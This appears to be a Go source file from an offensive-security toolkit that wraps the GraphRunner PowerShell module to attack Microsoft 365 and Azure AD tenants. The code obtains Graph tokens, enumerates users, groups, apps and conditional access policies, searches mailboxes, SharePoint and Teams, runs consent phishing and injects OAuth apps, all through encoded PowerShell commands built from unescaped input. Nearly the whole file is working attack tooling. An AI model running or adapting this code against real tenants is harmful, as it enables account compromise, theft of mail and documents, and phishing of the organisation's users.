package tools

import (
	"adpack/utils"
	"context"
	"encoding/json"
	"fmt"
	"os/exec"
)

type graphRunnerTool struct{}

var GraphRunner = graphRunnerTool{}

type GraphTokens struct {
	AccessToken  string `json:"access_token"`
	RefreshToken string `json:"refresh_token"`
	TenantID     string `json:"tenant_id"`
}

func (graphRunnerTool) Name() string { return "GraphRunner" }

func (graphRunnerTool) Available() bool {
	_, err := exec.LookPath("pwsh")
	return err == nil && utils.ResolveLocalPath("GraphRunner.ps1") != ""
}

func (g graphRunnerTool) buildCommand(tokens *GraphTokens, command string) (string, error) {
	path := utils.ResolveLocalPath("GraphRunner.ps1")
	if path == "" {
		return "", fmt.Errorf("GraphRunner.ps1 not found")
	}
	script := fmt.Sprintf(
		`Import-Module "%s" -Force; $tokens = @{access_token='%s';refresh_token='%s';tenant_id='%s'}; %s | ConvertTo-Json -Depth 10`,
		path, tokens.AccessToken, tokens.RefreshToken, tokens.TenantID, command,
	)
	return utils.EncodePowerShell(script), nil
}

func (g graphRunnerTool) runPS(ctx context.Context, tokens *GraphTokens, command string) (utils.CmdResult, error) {
	encoded, err := g.buildCommand(tokens, command)
	if err != nil {
		return utils.CmdResult{}, err
	}
	cr := utils.RunCommandCtx(ctx, "pwsh", []string{"-NoP", "-NonI", "-EncodedCommand", encoded})
	if !cr.Success {
		return cr, fmt.Errorf("graphrunner command failed: %s", cr.Stderr)
	}
	return cr, nil
}

func (g graphRunnerTool) GetTokens(ctx context.Context) (*GraphTokens, error) {
	path := utils.ResolveLocalPath("GraphRunner.ps1")
	if path == "" {
		return nil, fmt.Errorf("GraphRunner.ps1 not found")
	}
	script := fmt.Sprintf(`Import-Module "%s" -Force; Get-GraphTokens | ConvertTo-Json -Depth 10`, path)
	encoded := utils.EncodePowerShell(script)
	cr := utils.RunCommandCtx(ctx, "pwsh", []string{"-NoP", "-NonI", "-EncodedCommand", encoded})
	if !cr.Success {
		return nil, fmt.Errorf("graphrunner get tokens failed: %s", cr.Stderr)
	}
	var tokens GraphTokens
	if err := json.Unmarshal([]byte(cr.Stdout), &tokens); err != nil {
		return nil, fmt.Errorf("parsing tokens: %w", err)
	}
	return &tokens, nil
}

func (g graphRunnerTool) RunRecon(ctx context.Context, tokens *GraphTokens) (utils.CmdResult, error) {
	return g.runPS(ctx, tokens, `Invoke-GraphRunner -Tokens $tokens -DisableAll -ReconOnly`)
}

func (g graphRunnerTool) RunUserEnum(ctx context.Context, tokens *GraphTokens) (utils.CmdResult, error) {
	return g.runPS(ctx, tokens, `Get-AzureADUsers -Tokens $tokens`)
}

func (g graphRunnerTool) RunGroupEnum(ctx context.Context, tokens *GraphTokens) (utils.CmdResult, error) {
	return g.runPS(ctx, tokens, `Get-SecurityGroups -Tokens $tokens`)
}

func (g graphRunnerTool) RunAppEnum(ctx context.Context, tokens *GraphTokens) (utils.CmdResult, error) {
	return g.runPS(ctx, tokens, `Get-Applications -Tokens $tokens`)
}

func (g graphRunnerTool) RunCAPEnum(ctx context.Context, tokens *GraphTokens) (utils.CmdResult, error) {
	return g.runPS(ctx, tokens, `Get-ConditionalAccessPolicies -Tokens $tokens`)
}

func (g graphRunnerTool) RunMailboxSearch(ctx context.Context, tokens *GraphTokens, searchTerm string, msgCount int) (utils.CmdResult, error) {
	cmd := fmt.Sprintf(`Invoke-SearchMailbox -Tokens $tokens -SearchTerm "%s" -MessageCount %d`, searchTerm, msgCount)
	return g.runPS(ctx, tokens, cmd)
}

func (g graphRunnerTool) RunSharePointSearch(ctx context.Context, tokens *GraphTokens, searchTerm string) (utils.CmdResult, error) {
	cmd := fmt.Sprintf(`Invoke-SharePointSearch -Tokens $tokens -SearchTerm "%s"`, searchTerm)
	return g.runPS(ctx, tokens, cmd)
}

func (g graphRunnerTool) RunTeamsSearch(ctx context.Context, tokens *GraphTokens, searchTerm string) (utils.CmdResult, error) {
	cmd := fmt.Sprintf(`Search-TeamsMessages -Tokens $tokens -SearchTerm "%s"`, searchTerm)
	return g.runPS(ctx, tokens, cmd)
}

func (g graphRunnerTool) RunConsentPhish(ctx context.Context, tokens *GraphTokens, appURL string) (utils.CmdResult, error) {
	cmd := fmt.Sprintf(`Invoke-PhishUserConsent -Tokens $tokens -AppUrl "%s"`, appURL)
	return g.runPS(ctx, tokens, cmd)
}

func (g graphRunnerTool) RunInjectApp(ctx context.Context, tokens *GraphTokens, appName string) (utils.CmdResult, error) {
	cmd := fmt.Sprintf(`Invoke-InjectOAuthApp -Tokens $tokens -AppName "%s"`, appName)
	return g.runPS(ctx, tokens, cmd)
}
